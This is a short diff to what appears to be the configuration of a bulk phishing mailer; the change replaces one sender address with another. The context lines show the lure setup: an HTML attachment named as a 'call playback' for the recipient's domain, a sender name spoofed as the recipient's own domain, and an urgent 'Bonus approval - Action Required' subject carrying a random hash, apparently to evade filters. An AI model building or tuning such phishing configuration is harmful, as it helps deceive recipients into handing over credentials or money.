@@ -122,7 +122,7 @@ const options = {
 
 
 const attachmentNameWithPlaceholders = 'call_playback_{RECIPIENT_DOMAIN_NAME}.html';
-const senderAddresses = ['akash@telepresenz.com'];
+const senderAddresses = ['info@telepresenz.com'];
 const messageFile = 'message.html';
 const senderNameWithPlaceholders = "{RECIPIENT_DOMAIN_NAME}"; 
 const subjectLineWithPlaceholders = "Bonus approval [{RANDOM_MD5}] - Action Required]"
